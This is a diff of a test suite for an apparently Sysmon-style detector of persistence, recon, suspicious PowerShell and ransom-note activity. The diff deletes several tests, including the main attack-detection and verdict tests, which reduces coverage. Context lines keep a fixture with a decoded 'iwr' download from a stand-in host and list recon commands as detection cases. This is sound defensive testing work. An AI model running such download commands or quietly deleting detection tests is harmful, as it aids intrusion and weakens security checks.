@@ -15,40 +15,12 @@ def checks_fired(events):
 
 # ---------- false positives: normal activity must not be flagged ----------
 
-def test_benign_activity_has_no_findings():
-    findings = run_checks(benign_events())
-    assert findings == []
-    assert make_verdict(findings)["label"] == "Benign"
-
-
-def test_person_typing_whoami_and_ipconfig_is_not_a_recon_burst():
-    # benign_events() has whoami + ipconfig in a cmd window opened from explorer.exe
-    assert "recon_burst" not in checks_fired(benign_events())
-
-
 def test_edge_run_key_and_onedrive_are_known_good():
     assert "persistence" not in checks_fired(benign_events())
     assert "run_from_user_folder" not in checks_fired(benign_events())
 
 
 # ---------- the attack is caught ----------
-
-def test_attack_is_malicious_with_the_expected_findings():
-    findings = run_checks(attack_events())
-    fired = {f["check"] for f in findings}
-    assert {"persistence", "recon_burst", "lookalike_domain", "suspicious_powershell",
-            "document_app_spawns_program", "masquerading", "ransom_note",
-            "run_from_user_folder", "network_from_user_folder"} <= fired
-    assert make_verdict(findings)["label"] == "Malicious"
-
-
-def test_every_finding_points_to_real_events():
-    events = attack_events()
-    ids = {e["record_id"] for e in events}
-    for f in run_checks(events):
-        assert f["event_ids"], f
-        assert set(f["event_ids"]) <= ids
-
 
 def test_service_from_dropped_file_is_strong_but_program_files_service_is_not():
     events = attack_events() + [
@@ -256,18 +228,6 @@ def test_powershell_download_only_is_weak():
     assert finding["detail"] == "decoded command: iwr http://x.example/a"  # the analyst sees what it does
 
 
-def test_recon_typed_in_a_remote_admin_session_is_not_a_burst():
-    def recon(launcher):
-        return [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{l}", Image=launcher),
-                event(2, 1, "2026-01-05 09:00:01.000", ProcessGuid="{w}", ParentProcessGuid="{l}",
-                      Image="C:\\Windows\\System32\\whoami.exe", ParentImage=launcher),
-                event(3, 1, "2026-01-05 09:00:02.000", ProcessGuid="{n}", ParentProcessGuid="{l}",
-                      Image="C:\\Windows\\System32\\net.exe", ParentImage=launcher)]
-    assert "recon_burst" not in checks_fired(recon("C:\\Windows\\System32\\wsmprovhost.exe"))
-    assert [f["strength"] for f in run_checks(recon("C:\\Windows\\System32\\rundll32.exe"))
-            if f["check"] == "recon_burst"] == ["Strong"]
-
-
 def test_run_key_strength_depends_on_what_it_starts():
     run_key = "HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Tool"
     installer = "C:\\Users\\analyst\\Downloads\\setup.exe"
@@ -408,11 +368,6 @@ def test_command_line_findings_carry_the_rule_tag():
     assert (finding["tactic"], finding["technique"]) == ("Execution", "T1047 Windows Management Instrumentation")
 
 
-def test_only_low_findings_never_make_malicious():
-    weak = [{"strength": "Weak", "title": f"signal {n}"} for n in range(6)]
-    assert make_verdict(weak)["label"] == "Suspicious"
-
-
 def test_ransom_words_in_a_program_file_are_not_a_note():
     python = "C:\\Python314\\python.exe"
     events = [event(1, 11, "2026-01-05 09:00:00.000", Image=python,
@@ -421,12 +376,6 @@ def test_ransom_words_in_a_program_file_are_not_a_note():
 
 
 # ---------- verdict and helpers ----------
-
-def test_enrichment_can_raise_suspicious_to_malicious():
-    weak_only = [{"strength": "Weak", "title": "x"}]
-    assert make_verdict(weak_only)["label"] == "Suspicious"
-    assert make_verdict(weak_only, ["malicious"])["label"] == "Malicious"
-
 
 def test_edit_distance():
     assert edit_distance("fireeyee", "fireeye") == 1
